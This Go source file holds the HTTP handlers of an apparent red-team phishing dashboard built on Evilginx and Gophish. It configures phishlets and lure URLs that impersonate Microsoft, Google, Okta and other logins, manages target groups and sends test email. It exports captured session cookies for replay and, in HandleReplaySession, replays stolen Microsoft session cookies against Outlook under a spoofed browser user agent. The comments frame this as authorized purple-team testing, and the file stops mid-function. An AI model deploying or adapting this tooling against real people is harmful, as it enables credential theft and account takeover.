package handlers

import (
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/mail"
	"net/smtp"
	"net/url"
	"os"
	"os/exec"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/AuvaLabs/PhishLab-3.0/internal/gophish"
	"github.com/AuvaLabs/PhishLab-3.0/internal/store"
	"github.com/gorilla/mux"
)

// landingSubdomain maps a phishlet name to the subdomain its lure
// landing page is served on. Sourced from the upstream phishlets'
// is_landing proxy_hosts entries; kept as a lookup table to avoid
// reading and parsing every phishlet YAML on each /api/lures call.
var landingSubdomain = map[string]string{
	"o365":                "login",
	"microsoft-o365-adfs": "login",
	"microsoft-live":      "login",
	"google":              "accounts",
	"github":              "github",
	"linkedin":            "www",
	"twitter":             "twitter",
	"facebook":            "www",
	"instagram":           "www",
	"okta":                "login",
}

// LureView is the dashboard-facing summary of an Evilginx lure.
type LureView struct {
	Phishlet string `json:"phishlet"`
	Path     string `json:"path"`
	URL      string `json:"url"`
	Paused   int    `json:"paused"`
	Info     string `json:"info"`
}

// HandleGetLures reads the live Evilginx config and returns the
// list of currently-configured lures with their full landing URLs
// so the operator can copy/paste straight from the dashboard.
func (h *APIHandler) HandleGetLures(w http.ResponseWriter, r *http.Request) {
	const cfgPath = "/opt/evilginx2/state/config.json"
	data, err := os.ReadFile(cfgPath)
	if err != nil {
		writeJSON(w, http.StatusOK, []LureView{})
		return
	}
	var cfg struct {
		General struct {
			Domain string `json:"domain"`
		} `json:"general"`
		Phishlets map[string]struct {
			Hostname string `json:"hostname"`
			Enabled  bool   `json:"enabled"`
		} `json:"phishlets"`
		Lures []struct {
			Hostname string `json:"hostname"`
			Path     string `json:"path"`
			Phishlet string `json:"phishlet"`
			Paused   int    `json:"paused"`
			Info     string `json:"info"`
		} `json:"lures"`
	}
	if err := json.Unmarshal(data, &cfg); err != nil {
		writeError(w, http.StatusInternalServerError, "parse evilginx config: "+err.Error())
		return
	}
	out := make([]LureView, 0, len(cfg.Lures))
	for _, l := range cfg.Lures {
		host := l.Hostname
		if host == "" {
			ph, ok := cfg.Phishlets[l.Phishlet]
			if ok && ph.Hostname != "" {
				host = ph.Hostname
			} else {
				host = cfg.General.Domain
			}
		}
		sub := landingSubdomain[l.Phishlet]
		landing := host
		if sub != "" {
			landing = sub + "." + host
		}
		out = append(out, LureView{
			Phishlet: l.Phishlet,
			Path:     l.Path,
			URL:      "https://" + landing + l.Path,
			Paused:   l.Paused,
			Info:     l.Info,
		})
	}
	writeJSON(w, http.StatusOK, out)
}

// HandleGetGroups proxies the Gophish groups list to the dashboard.
func (h *APIHandler) HandleGetGroups(w http.ResponseWriter, r *http.Request) {
	if h.Gophish == nil {
		writeJSON(w, http.StatusOK, []gophish.Group{})
		return
	}
	groups, err := h.Gophish.GetGroups()
	if err != nil {
		writeError(w, http.StatusBadGateway, "gophish error: "+err.Error())
		return
	}
	if groups == nil {
		groups = []gophish.Group{}
	}
	writeJSON(w, http.StatusOK, groups)
}

// HandleCreateGroup creates a Gophish group of targets from a JSON
// body of the form:
//
//	{"name":"Pilot Group","targets":[
//	   {"email":"a@x.com","first_name":"A","last_name":"X","position":"IT"}
//	]}
func (h *APIHandler) HandleCreateGroup(w http.ResponseWriter, r *http.Request) {
	if h.Gophish == nil {
		writeError(w, http.StatusServiceUnavailable, "gophish not configured")
		return
	}
	var g gophish.Group
	if err := json.NewDecoder(r.Body).Decode(&g); err != nil {
		writeError(w, http.StatusBadRequest, "invalid body: "+err.Error())
		return
	}
	if g.Name == "" {
		writeError(w, http.StatusBadRequest, "name is required")
		return
	}
	created, err := h.Gophish.CreateGroup(g)
	if err != nil {
		writeError(w, http.StatusBadGateway, "gophish error: "+err.Error())
		return
	}
	writeJSON(w, http.StatusCreated, created)
}

// HandleGetSendingProfiles proxies the Gophish sending-profiles list.
func (h *APIHandler) HandleGetSendingProfiles(w http.ResponseWriter, r *http.Request) {
	if h.Gophish == nil {
		writeJSON(w, http.StatusOK, []gophish.SendingProfile{})
		return
	}
	profiles, err := h.Gophish.GetSendingProfiles()
	if err != nil {
		writeError(w, http.StatusBadGateway, "gophish error: "+err.Error())
		return
	}
	if profiles == nil {
		profiles = []gophish.SendingProfile{}
	}
	writeJSON(w, http.StatusOK, profiles)
}

// HandleGetPages proxies the Gophish landing-pages list.
func (h *APIHandler) HandleGetPages(w http.ResponseWriter, r *http.Request) {
	if h.Gophish == nil {
		writeJSON(w, http.StatusOK, []gophish.Page{})
		return
	}
	pages, err := h.Gophish.GetPages()
	if err != nil {
		writeError(w, http.StatusBadGateway, "gophish error: "+err.Error())
		return
	}
	if pages == nil {
		pages = []gophish.Page{}
	}
	writeJSON(w, http.StatusOK, pages)
}

// HandleGetCampaignDetail returns a single Gophish campaign by id,
// including its full result list (per-target send/open/click/submit).
// The dashboard uses this to populate the campaign-results modal.
func (h *APIHandler) HandleGetCampaignDetail(w http.ResponseWriter, r *http.Request) {
	if h.Gophish == nil {
		writeError(w, http.StatusServiceUnavailable, "gophish not configured")
		return
	}
	idStr := mux.Vars(r)["id"]
	id, err := strconv.ParseInt(idStr, 10, 64)
	if err != nil {
		writeError(w, http.StatusBadRequest, "bad campaign id")
		return
	}
	camp, err := h.Gophish.GetCampaign(id)
	if err != nil {
		writeError(w, http.StatusBadGateway, "gophish error: "+err.Error())
		return
	}
	writeJSON(w, http.StatusOK, camp)
}

// engagementUpdateRequest mirrors the editable subset of the Engagement
// model. Status and timestamps are managed server-side.
type engagementUpdateRequest struct {
	ID           string `json:"id"`
	Name         string `json:"name"`
	Client       string `json:"client"`
	Operator     string `json:"operator"`
	StartDate    string `json:"start_date"`
	EndDate      string `json:"end_date"`
	Domain       string `json:"domain"`
	PhishletName string `json:"phishlet_name"`
	RoEReference string `json:"roe_reference"`
	Notes        string `json:"notes"`
}

// HandleClearEngagement deletes all captured credentials and timeline
// events tied to the active engagement (or one specified via ?id=).
// The engagement metadata record is preserved so the operator can
// keep using the same engagement id; only the operational data is
// wiped. Destructive — invoked from a confirm dialog in the UI.
func (h *APIHandler) HandleClearEngagement(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")
	if id == "" {
		eng, _ := h.DB.GetActiveEngagement()
		if eng == nil {
			writeError(w, http.StatusBadRequest, "no active engagement")
			return
		}
		id = eng.ID
	}
	creds, events, err := h.DB.ClearEngagementData(id)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "clear failed: "+err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{
		"engagement_id":     id,
		"credentials_cleared": creds,
		"timeline_cleared":  events,
	})
}

// HandleUpdateEngagement updates the active engagement record from a
// JSON body. The runtime DB is the source of truth for the dashboard;
// the operator can re-sync `evilginx-lab.yaml` separately if desired
// (the deploy command upserts from yaml on every restart).
func (h *APIHandler) HandleUpdateEngagement(w http.ResponseWriter, r *http.Request) {
	var req engagementUpdateRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid body: "+err.Error())
		return
	}
	if req.ID == "" {
		eng, _ := h.DB.GetActiveEngagement()
		if eng == nil {
			writeError(w, http.StatusBadRequest, "id is required and no active engagement exists")
			return
		}
		req.ID = eng.ID
	}
	if err := h.DB.UpsertEngagement(store.Engagement{
		ID:           req.ID,
		Name:         req.Name,
		Client:       req.Client,
		Operator:     req.Operator,
		StartDate:    req.StartDate,
		EndDate:      req.EndDate,
		Domain:       req.Domain,
		PhishletName: req.PhishletName,
		RoEReference: req.RoEReference,
		Notes:        req.Notes,
		Status:       "active",
	}); err != nil {
		writeError(w, http.StatusInternalServerError, "upsert failed: "+err.Error())
		return
	}
	updated, _ := h.DB.GetEngagement(req.ID)
	writeJSON(w, http.StatusOK, updated)
}

// HandleDownloadCookies returns the captured cookie set for a session
// in Cookie-Editor's import format. The operator can pipe this into
// the Cookie-Editor browser extension to replay the stolen session.
func (h *APIHandler) HandleDownloadCookies(w http.ResponseWriter, r *http.Request) {
	sid := mux.Vars(r)["session_id"]
	if sid == "" {
		writeError(w, http.StatusBadRequest, "session_id required")
		return
	}
	creds, err := h.DB.GetAllCredentials()
	if err != nil {
		writeError(w, http.StatusInternalServerError, "db error")
		return
	}
	var match *store.CapturedCredential
	for i := range creds {
		if creds[i].SessionID == sid {
			match = &creds[i]
			break
		}
	}
	if match == nil {
		writeError(w, http.StatusNotFound, "session not found")
		return
	}
	type cookieEditor struct {
		Domain   string `json:"domain"`
		Name     string `json:"name"`
		Value    string `json:"value"`
		Path     string `json:"path"`
		HttpOnly bool   `json:"httpOnly"`
		Secure   bool   `json:"secure"`
		SameSite string `json:"sameSite"`
		Session  bool   `json:"session"`
	}
	type rawCookie struct {
		Name     string `json:"Name"`
		Value    string `json:"Value"`
		Path     string `json:"Path"`
		HttpOnly bool   `json:"HttpOnly"`
	}
	var jar map[string]map[string]rawCookie
	if err := json.Unmarshal([]byte(match.TokensJSON), &jar); err != nil {
		writeError(w, http.StatusInternalServerError, "tokens parse failed: "+err.Error())
		return
	}
	out := []cookieEditor{}
	for domain, names := range jar {
		for name, c := range names {
			out = append(out, cookieEditor{
				Domain:   domain,
				Name:     valueOr(c.Name, name),
				Value:    c.Value,
				Path:     valueOr(c.Path, "/"),
				HttpOnly: c.HttpOnly,
				Secure:   true,
				SameSite: "no_restriction",
				Session:  false,
			})
		}
	}
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Content-Disposition", `attachment; filename="cookies-session-`+sid+`.json"`)
	_ = json.NewEncoder(w).Encode(out)
}

func valueOr(s, fallback string) string {
	if s == "" {
		return fallback
	}
	return s
}

// HandleSendTestEmail sends a one-off test email through the active
// Gophish sending profile so the operator can verify deliverability
// before launching a real campaign. Body: {"to":"a@b.com"}.
// Uses Go's net/smtp directly so failures surface specifically
// (Gophish's send_test_email endpoint is unreliable about envelope
// formatting).
func (h *APIHandler) HandleSendTestEmail(w http.ResponseWriter, r *http.Request) {
	var body struct {
		To         string `json:"to"`
		ProfileID  int64  `json:"profile_id"`
		ProfileName string `json:"profile_name"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		writeError(w, http.StatusBadRequest, "invalid body")
		return
	}
	body.To = strings.TrimSpace(body.To)
	if _, err := mail.ParseAddress(body.To); err != nil {
		writeError(w, http.StatusBadRequest, "invalid recipient address")
		return
	}
	if h.Gophish == nil {
		writeError(w, http.StatusServiceUnavailable, "gophish not configured")
		return
	}
	profiles, err := h.Gophish.GetSendingProfiles()
	if err != nil || len(profiles) == 0 {
		writeError(w, http.StatusBadGateway, "no sending profiles available")
		return
	}
	var prof *gophish.SendingProfile
	for i := range profiles {
		if (body.ProfileID > 0 && profiles[i].ID == body.ProfileID) ||
			(body.ProfileName != "" && profiles[i].Name == body.ProfileName) {
			prof = &profiles[i]
			break
		}
	}
	if prof == nil {
		prof = &profiles[0]
	}
	host, port, err := net.SplitHostPort(prof.Host)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "bad smtp host: "+prof.Host)
		return
	}
	fromAddr := prof.Username
	if a, err := mail.ParseAddress(prof.FromAddress); err == nil {
		fromAddr = a.Address
	}
	subject := "[TEST] cyb3rdefence dashboard deliverability check"
	now := time.Now().UTC().Format(time.RFC1123Z)
	msg := []byte(fmt.Sprintf(
		"From: %s\r\nTo: %s\r\nSubject: %s\r\nDate: %s\r\nMIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n\r\nThis is a one-off test email sent from the evilginx-lab dashboard via the configured Gophish sending profile (%q). If you received this, SMTP auth + relay are working.\r\n",
		prof.FromAddress, body.To, subject, now, prof.Name,
	))
	addr := host + ":" + port
	auth := smtp.PlainAuth("", prof.Username, prof.Password, host)
	c, err := smtp.Dial(addr)
	if err != nil {
		writeError(w, http.StatusBadGateway, "smtp dial failed: "+err.Error())
		return
	}
	defer c.Close()
	_ = c.Hello("evilginx-lab")
	if ok, _ := c.Extension("STARTTLS"); ok {
		_ = c.StartTLS(&tls.Config{ServerName: host, MinVersion: tls.VersionTLS12})
	}
	if err := c.Auth(auth); err != nil {
		writeError(w, http.StatusBadGateway, "smtp auth failed: "+err.Error())
		return
	}
	if err := c.Mail(fromAddr); err != nil {
		writeError(w, http.StatusBadGateway, "smtp MAIL FROM failed: "+err.Error())
		return
	}
	if err := c.Rcpt(body.To); err != nil {
		writeError(w, http.StatusBadGateway, "smtp RCPT TO failed: "+err.Error())
		return
	}
	wc, err := c.Data()
	if err != nil {
		writeError(w, http.StatusBadGateway, "smtp DATA failed: "+err.Error())
		return
	}
	if _, err := wc.Write(msg); err != nil {
		writeError(w, http.StatusBadGateway, "smtp body write failed: "+err.Error())
		return
	}
	_ = wc.Close()
	_ = c.Quit()
	writeJSON(w, http.StatusOK, map[string]any{
		"sent_to": body.To,
		"via":     prof.Name,
		"host":    prof.Host,
	})
}

// HandleEngagementReport renders a Markdown report summarizing the
// active engagement: metadata, captured credentials with status +
// recommendations, timeline events, and a deliverability footer.
// Returned as a downloadable .md file ready to deliver to the client.
func (h *APIHandler) HandleEngagementReport(w http.ResponseWriter, r *http.Request) {
	eng, err := h.DB.GetActiveEngagement()
	if err != nil || eng == nil {
		writeError(w, http.StatusBadRequest, "no active engagement")
		return
	}
	creds, _ := h.DB.GetCredentials(eng.ID)
	timeline, _ := h.DB.GetTimeline(eng.ID, 500)
	campaigns, _ := h.DB.GetCampaigns(eng.ID)

	var b strings.Builder
	fmt.Fprintf(&b, "# Phishing Engagement Report — %s\n\n", eng.Name)
	fmt.Fprintf(&b, "Generated: %s UTC\n\n", time.Now().UTC().Format(time.RFC3339))
	b.WriteString("## Engagement\n\n")
	fmt.Fprintf(&b, "- **ID:** %s\n- **Client:** %s\n- **Operator:** %s\n- **Window:** %s — %s\n- **Domain:** %s\n- **Phishlet:** %s\n- **RoE:** %s\n",
		eng.ID, eng.Client, eng.Operator, eng.StartDate, eng.EndDate, eng.Domain, eng.PhishletName, eng.RoEReference)
	if eng.Notes != "" {
		fmt.Fprintf(&b, "- **Notes:** %s\n", eng.Notes)
	}
	b.WriteString("\n## Summary\n\n")
	exploitable, vulnerable, visited := 0, 0, 0
	for _, c := range creds {
		switch c.Status() {
		case "Exploitable":
			exploitable++
		case "Vulnerable":
			vulnerable++
		default:
			visited++
		}
	}
	fmt.Fprintf(&b, "- Total sessions captured: **%d**\n  - Exploitable (replayable session cookies): **%d**\n  - Vulnerable (creds POSTed): **%d**\n  - Visited (lure click only): **%d**\n",
		len(creds), exploitable, vulnerable, visited)
	fmt.Fprintf(&b, "- Campaigns launched: **%d**\n- Timeline events: **%d**\n\n", len(campaigns), len(timeline))

	b.WriteString("## Captured Sessions\n\n")
	if len(creds) == 0 {
		b.WriteString("_No sessions captured yet._\n\n")
	}
	for _, c := range creds {
		fmt.Fprintf(&b, "### Session %s — %s\n\n", c.SessionID, c.Status())
		fmt.Fprintf(&b, "- **Username:** `%s`\n- **Phishlet:** `%s`\n- **Source IP:** `%s`\n- **User Agent:** `%s`\n- **Captured At:** %s\n- **Tokens Captured:** %d\n\n",
			valueOr(c.Username, "(none)"), c.Phishlet, c.RemoteAddr, c.UserAgent, c.CapturedAt.Format(time.RFC3339), c.CookieCount())
		recs := c.Recommendations()
		if len(recs) > 0 {
			b.WriteString("**Recommended Remediation:**\n\n")
			for _, r := range recs {
				fmt.Fprintf(&b, "- %s\n", r)
			}
			b.WriteString("\n")
		}
	}

	if len(campaigns) > 0 {
		b.WriteString("## Campaigns\n\n")
		b.WriteString("| ID | Name | Status | Targets | Launched |\n|---|---|---|---|---|\n")
		for _, c := range campaigns {
			fmt.Fprintf(&b, "| %d | %s | %s | %d | %s |\n", c.ID, c.Name, c.Status, c.TargetCount, c.LaunchedAt.Format("2006-01-02"))
		}
		b.WriteString("\n")
	}

	if len(timeline) > 0 {
		b.WriteString("## Timeline\n\n")
		b.WriteString("| When | Source | Event | Email |\n|---|---|---|---|\n")
		sorted := make([]store.TimelineEvent, len(timeline))
		copy(sorted, timeline)
		sort.Slice(sorted, func(i, j int) bool { return sorted[i].Timestamp.Before(sorted[j].Timestamp) })
		for _, e := range sorted {
			fmt.Fprintf(&b, "| %s | %s | %s | %s |\n", e.Timestamp.Format(time.RFC3339), e.Source, e.EventType, e.Email)
		}
	}

	w.Header().Set("Content-Type", "text/markdown; charset=utf-8")
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="engagement-report-%s-%s.md"`, eng.ID, time.Now().UTC().Format("20060102")))
	_, _ = w.Write([]byte(b.String()))
}

// HandleDNSHealth returns the SPF/MX/DKIM/DMARC status of the
// active engagement's phishing domain. Used by the dashboard's
// DNS Health card to surface deliverability problems early.
func (h *APIHandler) HandleDNSHealth(w http.ResponseWriter, r *http.Request) {
	eng, _ := h.DB.GetActiveEngagement()
	domainParam := r.URL.Query().Get("domain")
	apex := domainParam
	if apex == "" && eng != nil {
		// strip subdomain to get apex (login.cyb3rdefence.com -> cyb3rdefence.com)
		apex = eng.Domain
	}
	if apex == "" {
		writeError(w, http.StatusBadRequest, "no domain")
		return
	}
	parts := strings.Split(apex, ".")
	if len(parts) > 2 {
		apex = strings.Join(parts[len(parts)-2:], ".")
	}

	type check struct {
		Name   string `json:"name"`
		Status string `json:"status"` // pass | warn | fail
		Detail string `json:"detail"`
	}
	results := []check{}

	// MX
	if mxs, err := net.LookupMX(apex); err == nil && len(mxs) > 0 {
		hosts := []string{}
		for _, mx := range mxs {
			hosts = append(hosts, fmt.Sprintf("%s (prio %d)", strings.TrimSuffix(mx.Host, "."), mx.Pref))
		}
		results = append(results, check{Name: "MX", Status: "pass", Detail: strings.Join(hosts, ", ")})
	} else {
		results = append(results, check{Name: "MX", Status: "fail", Detail: "no MX records"})
	}

	// SPF
	spfFound := false
	if txts, err := net.LookupTXT(apex); err == nil {
		for _, t := range txts {
			if strings.HasPrefix(t, "v=spf1") {
				results = append(results, check{Name: "SPF", Status: "pass", Detail: t})
				spfFound = true
				break
			}
		}
	}
	if !spfFound {
		results = append(results, check{Name: "SPF", Status: "fail", Detail: "no v=spf1 TXT record"})
	}

	// DMARC
	dmarcFound := false
	if txts, err := net.LookupTXT("_dmarc." + apex); err == nil {
		for _, t := range txts {
			if strings.HasPrefix(t, "v=DMARC1") {
				status := "pass"
				if !strings.Contains(t, "p=") || strings.Contains(t, "p=none") {
					status = "warn"
				}
				results = append(results, check{Name: "DMARC", Status: status, Detail: t})
				dmarcFound = true
				break
			}
		}
	}
	if !dmarcFound {
		results = append(results, check{Name: "DMARC", Status: "fail", Detail: "no _dmarc TXT record"})
	}

	// DKIM (probe common selectors)
	dkimFound := false
	for _, sel := range []string{"s1-ionos", "s2-ionos", "default", "google", "selector1", "selector2", "k1", "dkim", "mail"} {
		if cnames, err := net.LookupCNAME(sel + "._domainkey." + apex); err == nil && cnames != "" {
			if txts, _ := net.LookupTXT(sel + "._domainkey." + apex); len(txts) > 0 {
				results = append(results, check{Name: "DKIM", Status: "pass", Detail: "selector " + sel + " resolves"})
				dkimFound = true
				break
			}
		}
	}
	if !dkimFound {
		results = append(results, check{Name: "DKIM", Status: "warn", Detail: "no common selector resolves; mail will not be signed"})
	}

	writeJSON(w, http.StatusOK, map[string]any{
		"domain":  apex,
		"results": results,
	})
}

// PhishletState is the dashboard-facing summary of a phishlet's
// current configuration in evilginx.
type PhishletState struct {
	Name     string `json:"name"`
	Hostname string `json:"hostname"`
	Enabled  bool   `json:"enabled"`
	Visible  bool   `json:"visible"`
	Lures    int    `json:"lures"`
}

// HandleGetPhishletsState reads /opt/evilginx2/state/config.json and
// returns each phishlet's current enabled/hostname state plus the
// number of lures pointing at it. Used by the Phishlets tab on the
// dashboard so operators can enable/disable phishlets and create
// lures without dropping to the evilginx CLI.
func (h *APIHandler) HandleGetPhishletsState(w http.ResponseWriter, r *http.Request) {
	const cfgPath = "/opt/evilginx2/state/config.json"
	data, err := os.ReadFile(cfgPath)
	if err != nil {
		writeJSON(w, http.StatusOK, []PhishletState{})
		return
	}
	var cfg struct {
		Phishlets map[string]struct {
			Hostname string `json:"hostname"`
			Enabled  bool   `json:"enabled"`
			Visible  bool   `json:"visible"`
		} `json:"phishlets"`
		Lures []struct {
			Phishlet string `json:"phishlet"`
		} `json:"lures"`
	}
	if err := json.Unmarshal(data, &cfg); err != nil {
		writeError(w, http.StatusInternalServerError, "parse evilginx config: "+err.Error())
		return
	}
	lureCount := map[string]int{}
	for _, l := range cfg.Lures {
		lureCount[l.Phishlet]++
	}
	out := make([]PhishletState, 0, len(cfg.Phishlets))
	for name, ph := range cfg.Phishlets {
		out = append(out, PhishletState{
			Name:     name,
			Hostname: ph.Hostname,
			Enabled:  ph.Enabled,
			Visible:  ph.Visible,
			Lures:    lureCount[name],
		})
	}
	sort.Slice(out, func(i, j int) bool {
		if out[i].Enabled != out[j].Enabled {
			return out[i].Enabled
		}
		return out[i].Name < out[j].Name
	})
	writeJSON(w, http.StatusOK, out)
}

// editEvilginxConfig acquires a transactional read+write of the
// evilginx config.json. Caller mutates the loaded map and returns
// it; the function persists atomically via tmp+rename and triggers
// a service restart so evilginx reloads the changes.
func editEvilginxConfig(mutate func(cfg map[string]any) error) error {
	const cfgPath = "/opt/evilginx2/state/config.json"
	data, err := os.ReadFile(cfgPath)
	if err != nil {
		return fmt.Errorf("read evilginx config: %w", err)
	}
	var cfg map[string]any
	if err := json.Unmarshal(data, &cfg); err != nil {
		return fmt.Errorf("parse evilginx config: %w", err)
	}
	if err := mutate(cfg); err != nil {
		return err
	}
	out, err := json.MarshalIndent(cfg, "", "  ")
	if err != nil {
		return err
	}
	tmp := cfgPath + ".tmp"
	if err := os.WriteFile(tmp, out, 0644); err != nil {
		return err
	}
	if err := os.Rename(tmp, cfgPath); err != nil {
		return err
	}
	// Restart evilginx so it picks up the new config. Best-effort —
	// the systemctl call may not be available in some test envs.
	_ = exec.Command("systemctl", "restart", "evilginx").Run()
	return nil
}

// HandleEnablePhishlet sets a phishlet's hostname + enabled=true on
// the live evilginx config. Body: {"phishlet":"o365","hostname":"example.com"}.
func (h *APIHandler) HandleEnablePhishlet(w http.ResponseWriter, r *http.Request) {
	var body struct {
		Phishlet string `json:"phishlet"`
		Hostname string `json:"hostname"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Phishlet == "" {
		writeError(w, http.StatusBadRequest, "phishlet name required")
		return
	}
	err := editEvilginxConfig(func(cfg map[string]any) error {
		ph, _ := cfg["phishlets"].(map[string]any)
		if ph == nil {
			return fmt.Errorf("phishlets section missing in config")
		}
		entry, _ := ph[body.Phishlet].(map[string]any)
		if entry == nil {
			return fmt.Errorf("phishlet %q not found", body.Phishlet)
		}
		if body.Hostname != "" {
			entry["hostname"] = body.Hostname
		}
		entry["enabled"] = true
		ph[body.Phishlet] = entry
		return nil
	})
	if err != nil {
		writeError(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"phishlet": body.Phishlet, "enabled": true})
}

// HandleDisablePhishlet flips enabled=false on the named phishlet.
func (h *APIHandler) HandleDisablePhishlet(w http.ResponseWriter, r *http.Request) {
	name := mux.Vars(r)["phishlet"]
	if name == "" {
		writeError(w, http.StatusBadRequest, "phishlet name required")
		return
	}
	err := editEvilginxConfig(func(cfg map[string]any) error {
		ph, _ := cfg["phishlets"].(map[string]any)
		entry, _ := ph[name].(map[string]any)
		if entry == nil {
			return fmt.Errorf("phishlet %q not found", name)
		}
		entry["enabled"] = false
		ph[name] = entry
		return nil
	})
	if err != nil {
		writeError(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"phishlet": name, "enabled": false})
}

// HandleCreateLure appends a lure for the named phishlet at a
// random path. Body: {"phishlet":"o365"}. The phishlet must
// already be enabled.
func (h *APIHandler) HandleCreateLure(w http.ResponseWriter, r *http.Request) {
	var body struct {
		Phishlet string `json:"phishlet"`
		Path     string `json:"path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Phishlet == "" {
		writeError(w, http.StatusBadRequest, "phishlet name required")
		return
	}
	if body.Path == "" {
		body.Path = "/" + randString(8)
	} else if !strings.HasPrefix(body.Path, "/") {
		body.Path = "/" + body.Path
	}
	err := editEvilginxConfig(func(cfg map[string]any) error {
		luresAny, _ := cfg["lures"].([]any)
		luresAny = append(luresAny, map[string]any{
			"hostname":     "",
			"id":           "",
			"info":         "",
			"og_desc":      "",
			"og_image":     "",
			"og_title":     "",
			"og_url":       "",
			"path":         body.Path,
			"paused":       0,
			"phishlet":     body.Phishlet,
			"redirect_url": "",
			"redirector":   "",
			"ua_filter":    "",
		})
		cfg["lures"] = luresAny
		return nil
	})
	if err != nil {
		writeError(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusCreated, map[string]any{"phishlet": body.Phishlet, "path": body.Path})
}

// HandleReplaySession attempts to use the captured cookies of a
// session against Microsoft's web surface (outlook.office.com by
// default; portal.office.com on demand) so the operator can confirm
// the session is hot AND so the target's CSOC observes a known
// adversary-style sign-in for detection-tuning purposes.
//
// This is the purple-team validation step: send authenticated
// traffic from a known attacker IP using stolen tokens, then walk
// the defenders through their SIEM to see what fired. The dashboard
// host's IP is the source; the CSOC should pre-receive a list of
// allowed test IPs so the alert is unambiguous.
//
// Body (optional): {"target":"https://outlook.office.com/"}.
// Response includes: success bool, final URL, HTTP status,
// authenticated bool (false if Microsoft bounced us back to the
// login page), elapsed ms, response-body snippet (4KB max).
func (h *APIHandler) HandleReplaySession(w http.ResponseWriter, r *http.Request) {
	sid := mux.Vars(r)["session_id"]
	if sid == "" {
		writeError(w, http.StatusBadRequest, "session_id required")
		return
	}
	creds, err := h.DB.GetAllCredentials()
	if err != nil {
		writeError(w, http.StatusInternalServerError, "db error")
		return
	}
	var match *store.CapturedCredential
	for i := range creds {
		if creds[i].SessionID == sid {
			match = &creds[i]
			break
		}
	}
	if match == nil {
		writeError(w, http.StatusNotFound, "session not found")
		return
	}
	if !match.HasReplayableSessionCookie() {
		writeError(w, http.StatusBadRequest, "session has no replayable Microsoft auth cookies (status: "+match.Status()+")")
		return
	}

	target := "https://outlook.office.com/"
	if t := r.URL.Query().Get("target"); t != "" {
		target = t
	}

	// Build a cookie jar from the captured tokens. The on-disk
	// schema is map[domain]map[name]{Name,Value,Path,HttpOnly}.
	type rawCookie struct {
		Name     string `json:"Name"`
		Value    string `json:"Value"`
		Path     string `json:"Path"`
		HttpOnly bool   `json:"HttpOnly"`
	}
	var raw map[string]map[string]rawCookie
	if err := json.Unmarshal([]byte(match.TokensJSON), &raw); err != nil {
		writeError(w, http.StatusInternalServerError, "tokens parse failed: "+err.Error())
		return
	}

	jar, _ := cookiejar.New(nil)
	for domain, byName := range raw {
		// CookieJar.SetCookies wants a canonical URL; strip leading dot.
		host := strings.TrimPrefix(domain, ".")
		u, err := url.Parse("https://" + host + "/")
		if err != nil {
			continue
		}
		var cookies []*http.Cookie
		for name, c := range byName {
			cookies = append(cookies, &http.Cookie{
				Name:     valueOr(c.Name, name),
				Value:    c.Value,
				Path:     valueOr(c.Path, "/"),
				HttpOnly: c.HttpOnly,
				Secure:   true,
				Domain:   host,
			})
		}
		jar.SetCookies(u, cookies)
	}

	// Track redirect chain so the operator can correlate the trace
	// with what their CSOC sees in proxy / sign-in logs.
	chain := []string{}
	client := &http.Client{
		Jar: jar,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{MinVersion: tls.VersionTLS12},
		},
		Timeout: 30 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 12 {
				return errors.New("too many redirects")
			}
			chain = append(chain, req.URL.String())
			return nil
		},
	}

	req, err := http.NewRequestWithContext(r.Context(), http.MethodGet, target, nil)
	if err != nil {
		writeError(w, http.StatusBadRequest, "bad target: "+err.Error())
		return
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")

	started := time.Now()
	resp, err := client.Do(req)
	elapsed := time.Since(started)
	if err != nil {
		writeJSON(w, http.StatusOK, map[string]any{
			"success":        false,
			"session_id":     sid,
			"username":       match.Username,
			"target":         target,
			"redirect_chain": chain,
			"error":          err.Error(),
			"duration_ms":    elapsed.Milliseconds(),
			"started_at":     started.UTC().Format(time.RFC3339),
		})
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))

	finalURL := resp.Request.URL.String()
	finalHost := resp.Request.URL.Host
	// If we ended up at a Microsoft login origin, the cookies didn't
	// authenticate us; Microsoft is asking us to log in afresh.
	bouncedToLogin := strings.HasSuffix(finalHost, "login.microsoftonline.com") ||
		strings.HasSuffix(finalHost, "login.live.com") ||
		strings.HasSuffix(finalHost, "login.microsoftonline.us") ||
		strings.HasSuffix(finalHost, "account.microsoft.com") && strings.Contains(finalURL, "login")

	authenticated := !bouncedToLogin && resp.StatusCode < 400

	writeJSON(w, http.StatusOK, map[string]any{
		"success":        authenticated,
		"session_id":     sid,
		"username":       match.Username,
		"target":         target,
		"final_url":      finalURL,
		"final_host":     finalHost,
		"status_code":    resp.StatusCode,
		"authenticated":  authenticated,
		"redirect_chain": chain,
		"duration_ms":    elapsed.Milliseconds(),
		"started_at":     started.UTC().Format(time.RFC3339),
		"source_ip":      "(this dashboard host - share with CSOC for alert correlation)",
		"body_snippet":   string(body),
	})
}

func randString(n int) string {
